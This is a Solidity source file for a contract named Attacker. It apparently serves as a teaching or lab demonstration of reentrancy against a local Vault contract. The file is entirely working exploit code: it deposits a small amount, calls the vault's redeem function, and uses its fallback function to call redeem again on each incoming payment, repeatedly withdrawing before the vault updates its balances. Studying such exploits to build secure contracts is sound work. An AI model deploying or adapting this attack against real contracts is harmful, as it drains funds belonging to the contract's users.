// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import "./Vault.sol";

contract Attacker {

    event RedeemCall(uint callCount);
    event FallbackCall(uint callCount, uint value);
  
    Vault vault;
    uint redeemCallCount;
    uint fallbackCallCount;
 

    constructor(address _contractAddr) {
        // 1) Init deployed Vault contract from contract address
        vault = Vault(_contractAddr);
    }

    fallback() external payable {
        emit FallbackCall(++fallbackCallCount, msg.value);
        this.redeem();
    }
 
    // 2) Store a little to be able to do a reddem
    function store() external payable {
        vault.store{value: msg.value}();
    }
      
    // 3) start the real attack with a first redeem call
    function redeem() external {
        emit RedeemCall(++redeemCallCount);
        vault.redeem();
    }
}
